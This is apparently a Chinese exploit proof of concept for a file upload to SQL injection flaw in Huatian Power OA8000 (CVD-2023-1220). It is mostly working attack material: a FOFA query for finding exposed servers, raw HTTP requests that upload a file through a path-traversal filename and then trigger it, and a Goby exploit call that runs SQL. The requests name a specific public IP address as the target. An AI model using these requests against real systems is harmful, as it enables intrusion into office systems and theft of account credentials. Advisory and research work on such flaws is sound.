# 华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220

    ## fofa

```
body="/OAapp/WebObjects/OAapp.woa"
```

华天动力OA是一款将先进的管理思想、 管理模式和软件技术、网络技术相结合，为用户提供了低成本、 高效能的协同办公和管理平台。华天动力OA MyHttpServlet 存在任意文件上传漏洞，攻击者可上传恶意的raq文件并执行raq文件中的任意sql语句，获取用户账号密码等敏感信息。



## poc

### 上传req

```
POST /OAapp/MyHttpServlet HTTP/1.1
Host: 101.200.223.75
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a
Accept-Encoding: gzip
Content-Length: 181

--9b0af0d79eaea67c3aa1889b0b43a50a
Content-Disposition: form-data; name="file"; filename="\\Temp\\../../../report/reportFiles/55cBED.jpg"

RQQR
--9b0af0d79eaea67c3aa1889b0b43a50a--
```

### 访问

```
GET /report/reportJsp/showHTReport.jsp?reportFile=55cBED.jpg HTTP/1.1
Host: 101.200.223.75
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```



## gobyexp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 94

{"hostinfo":"http://101.200.223.75","vulfile":"CVD-2023-1220.go","expparams":{"sql":"user()"}}
```
